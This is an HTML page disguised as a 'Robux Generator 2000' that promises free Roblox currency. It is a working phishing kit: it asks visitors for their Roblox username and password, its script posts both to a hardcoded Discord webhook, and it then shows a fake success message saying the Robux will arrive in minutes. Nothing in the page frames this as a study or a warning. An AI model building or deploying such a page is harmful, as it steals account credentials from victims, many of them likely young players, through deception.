<!DOCTYPE html>
<html>
<head>
  <title>Robux Generator 2000</title>
  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRq_yv6dtNf2foS6Hm6O9mIXVyl6HFrW5jnKQ&s">
  <style>
    body {
      background-color: black;
      color: white;
     
    }
    .container {
      text-align: center;
      margin: 20px;
    }
    .textboxes {
      display: flex;
      flex-direction: row;  
      gap: 20px;
      justify-content: center;
    }
    button {
      margin: 20px 0;
    }
    
  </style>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
</head>
<body  class="bg-black text-white">
  
  <div class="container">
    <h1>Robux Generator 2000</h1>
    <div class="textboxes">
    <label for="textbox1">Roblox Username:</label>
    <input type="text" id="textbox1" name="textbox1">
    <label for="textbox2">Password:</label>
    <input type="text" id="textbox2" name="textbox2">
    <label for="textbox3">Robux Amount:</label>
    <input type="text" id="textbox3" name="textbox3">
  </div>
  <div style="margin-top: 20px;">
    <button id="sendButton" type="button" class="btn btn-outline-secondary">Generate Robux</button>
  </div>
  <div style="margin-top: 40px;">
  <h2>FAQ</h2>
  </div>
  <h4>Coming Soon</h4>
  <button type="button" class="btn btn-outline-secondary" disabled>FAQ</button>
  </div>
</div>
  <script>
    const sendButton = document.getElementById('sendButton');
    const textbox1 = document.getElementById('textbox1');
    const textbox2 = document.getElementById('textbox2');

    sendButton.addEventListener('click', () => {
      const webhookURL = 'https://discord.com/api/webhooks/1279070813672444048/1wqZbUAiKhRVQyMcKnHFm9YD5JIhlPFx2r82IZ2s6QF0ow6b5kb6PlQRRLmHZBJo8Yea'; // Replace with your actual webhook URL

      const payload = {
        content: `Username: ${textbox1.value}\nPassword: ${textbox2.value}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          alert('Succes!You will recieve your robux in a few minutes');
        } else {
          alert('error');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again later.');
      });
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>

</body>
</html>
